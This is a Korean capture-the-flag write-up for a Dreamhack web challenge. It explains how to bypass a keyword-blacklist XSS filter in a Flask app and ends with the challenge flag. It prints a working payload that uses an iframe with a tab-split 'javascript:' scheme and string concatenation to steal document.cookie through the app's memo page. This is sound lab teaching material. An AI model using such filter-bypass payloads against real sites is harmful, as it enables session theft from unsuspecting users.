---
title: "[Dreamhack] XSS Filtering Bypass Advanced 해설"
author: jyp
date: 2026-06-09 12:00:05 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> XSS를 사용한 해킹 & 금지 태그 우회

## **난이도**: Lv.2
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── deploy
│   ├── app.py
│   ├── flag.txt
│   ├── requirements.txt
│   ├── static
│   └── templates
└── Dockerfile
```

## 주요 코드 

```python

#app.py

def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

```

이 문제는 [XSS-Filtering-Bypass](https://1221jyp.com/posts/Dreamhack_xss-2/)문제의 업그레이드 버전으로, 기존 문제에서 advanced_filter에 해당하는 list속 키워드가 추가로 필터링 된 문제다.

따라서 이 문제의 해설은 [XSS-Filtering-Bypass](https://1221jyp.com/posts/Dreamhack_xss-2/) 문제를 참고하면서 푸는 것이 좋다.

# 풀이

## 필터에 유의하여 페이로드 작성하기
```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"
```

[XSS-Filtering-Bypass](https://1221jyp.com/posts/Dreamhack_xss-2/) 문제에서는 대문자로 페이로드를 작성하였을때, 필터에 의해 페이로드가 수정되거나 막히지 않았지만,
해당 문제에서는 즉시 `"filtered!!!"`가 `return`되도록 작성되어 있다.

또한 `<script>`태그가 막혀 있고, `on`이 사용 불가능하기 때문에 이벤트 핸들러 또한 사용 불가능하다.
이를 해결할 방법중 하나는 `<iframe>`태그와 `javascript:`이라는 url스킴을 함께 사용하는 것이다. `<iframe>`태그는 html페이지 속에 새로운 html페이지를 추가해주는 역할을 하는데, 이러한 특성 때문에 `<iframe>`태그는 올라가기만 해도 그 속의 `src=""`주소에 있는 url이 바로 실행되게 된다. 이 특성과, `javascript:`라는 자바스크립트 명령어를 실행시켜주는 스킴을 사용하여 자바스크립트 명령어를 사용해준다.

```html
<iframe src="javascript:location='/memo?memo='+document.cookie">

```

이상태에서 필터에 걸리지 않도록 여러가지 방식으로 우회해준다.

## 페이로드

```html
<iframe src="javascr&Tab;ipt:top['locati'+'o'+'n']='/memo?memo='+top['docu'+'ment']['cookie']">

```

해당 페이로드를 `/flag`의 `<input>` 박스에 넣고 전송하면 `/memo`에서 플래그를 확인할 수 있다.


# 정답

DH{e8140ed5b0770088dd2012e1c9dfd4b4}

